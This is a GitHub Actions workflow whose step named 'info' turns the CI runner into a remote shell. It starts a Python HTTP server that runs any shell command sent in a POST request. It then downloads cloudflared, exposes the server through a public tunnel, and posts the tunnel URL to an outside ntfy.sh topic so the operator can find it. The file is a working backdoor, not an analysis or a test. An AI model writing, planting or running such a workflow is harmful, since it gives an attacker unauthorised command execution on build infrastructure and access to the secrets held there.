name: dao-exec
on:
  push:
    branches:
      - 'dao-exec-trigger'
  workflow_dispatch:
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: info
        run: |
          id
          hostname
          uname -a
          date
          # Install cloudflared and start server
          python3 -c "
import http.server,json,subprocess,socket

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self,*a):pass
    def do_GET(self):
        self.send_response(200);self.send_header('Content-Type','application/json');self.end_headers()
        self.wfile.write(json.dumps({'ok':True,'host':socket.gethostname()}).encode())
    def do_POST(self):
        n=int(self.headers.get('Content-Length',0));d=json.loads(self.rfile.read(n))
        out=subprocess.check_output(d.get('cmd','id'),shell=True,timeout=30,stderr=subprocess.STDOUT).decode()
        self.send_response(200);self.send_header('Content-Type','application/json');self.end_headers()
        self.wfile.write(json.dumps({'out':out}).encode())
import threading,time
t=threading.Thread(target=lambda:http.server.HTTPServer(('',9090),H).serve_forever());t.daemon=True;t.start()
print('server on 9090')
time.sleep(2)
" &
          sleep 2
          curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cfd
          chmod +x /tmp/cfd
          /tmp/cfd tunnel --url http://localhost:9090 --no-autoupdate > /tmp/cf.log 2>&1 &
          sleep 25
          URL=$(grep -o 'https://[a-z0-9-]*.trycloudflare.com' /tmp/cf.log | tail -1)
          echo "SHELL_URL=$URL"
          curl -s -X POST https://ntfy.sh/dao276-gha -H "Title: GHA-URL" -d "$URL" || true
          sleep 1200
